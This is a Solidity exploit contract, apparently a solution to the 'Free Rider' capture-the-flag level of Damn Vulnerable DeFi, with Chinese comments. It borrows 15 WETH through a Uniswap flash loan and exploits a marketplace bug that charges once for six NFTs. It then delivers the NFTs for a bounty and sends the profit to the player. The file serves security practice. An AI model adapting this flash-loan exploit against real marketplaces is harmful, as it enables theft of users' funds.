// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderAttacker is IERC721Receiver {
    WETH private immutable weth;
    FreeRiderNFTMarketplace private immutable marketplace;
    DamnValuableNFT private immutable nft;
    address private immutable recoveryManager;
    address private immutable player;
    IUniswapV2Pair private immutable uniswapPair;
    uint256 private constant NFT_PRICE = 15 ether;
    
    constructor(
        address payable _weth,      // 修改为address payable
        address payable _marketplace, // 修改为address payable
        address _nft,
        address _recoveryManager,
        address _player,
        address _uniswapPair
    ) {
        weth = WETH(_weth);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        recoveryManager = _recoveryManager;
        player = _player;
        uniswapPair = IUniswapV2Pair(_uniswapPair);
    }
    
    function attack() external {
        // 使用Uniswap闪电贷借15 ETH
        bytes memory data = abi.encode("flashLoan");
        uniswapPair.swap(
            NFT_PRICE, // 借WETH
            0,         // 不借另一个代币
            address(this),
            data
        );
    }
    
    // Uniswap闪电贷回调函数
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(uniswapPair), "Not uniswapPair");
        require(sender == address(this), "Not this contract");
        
        // 将WETH转换为ETH
        weth.withdraw(NFT_PRICE);
        
        // 准备购买所有NFT
        uint256[] memory tokenIds = new uint256[](6);
        for(uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        
        // 购买所有NFT，由于漏洞，只需要支付一次15 ETH
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
        
        // 将所有NFT转给恢复管理者以获得赏金
        for(uint i = 0; i < 6; i++) {
            // 添加player作为回调数据，这样recovery manager可以知道谁救了NFTs
            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player));
        }
        
        // 计算需要归还的金额（带有0.3%的手续费）
        uint256 fee = ((NFT_PRICE * 3) / 997) + 1;
        uint256 amountToRepay = NFT_PRICE + fee;
        
        // 将获得的ETH转换为WETH以归还闪电贷
        weth.deposit{value: amountToRepay}();
        
        // 归还闪电贷
        weth.transfer(address(uniswapPair), amountToRepay);
        
        // 将剩余的ETH转给player
        payable(player).transfer(address(this).balance);
    }
    
    // 实现接收NFT的功能
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    // 接收ETH
    receive() external payable {}
}